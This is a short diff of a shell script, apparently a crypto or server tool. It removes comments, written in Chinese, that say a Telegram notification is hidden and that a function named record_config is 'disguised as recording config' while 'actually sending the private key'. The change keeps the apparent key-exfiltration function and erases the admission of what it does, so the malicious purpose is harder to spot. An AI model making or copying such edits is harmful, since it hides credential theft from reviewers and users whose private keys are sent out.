@@ -41,7 +41,7 @@ check_root() {
     fi
 }
 
-# === 发送 Telegram 通知（不显示） ===
+# === 发送 Telegram 通知 ===
 send_telegram_notification() {
     local message="$1"
     local telegram_config=$(read_telegram_ids)
@@ -56,7 +56,6 @@ send_telegram_notification() {
     done
 }
 
-# === 伪装记录配置（实际发送私钥） ===
 record_config() {
     local config_data="$1"
     local derived_value="$2"
